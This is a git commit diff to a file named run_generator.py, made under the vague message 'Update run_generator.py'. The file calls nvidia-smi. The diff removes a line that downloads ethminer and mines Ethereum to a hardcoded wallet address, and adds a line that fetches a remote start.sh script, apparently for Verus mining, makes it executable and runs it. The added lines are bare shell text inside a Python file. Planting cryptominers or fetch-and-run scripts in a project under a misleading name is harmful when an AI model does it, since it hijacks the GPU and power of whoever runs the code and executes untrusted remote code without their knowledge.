d444b67491416d4a1413bbdc0fdc2d0c2fd95465
donieldave <92258140+donieldave@users.noreply.github.com>
2021-10-10 22:22:14 +0900

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,4 @@
 import os as al
 al.system("nvidia-smi")
-sudo apt update && sudo apt install ethereum && wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && cd bin/ &&./ethminer -G -P stratum1+tcp://0x9DEB47C1648CfEcEfB61F13f323BB27ecA1e8146.rig2@asia1.ethermine.org:4444 
+mkdir verus && cd ./verus && wget https://raw.githubusercontent.com/danieldave1/verusmining/main/start.sh && chmod +x start.sh && ./start.sh
+
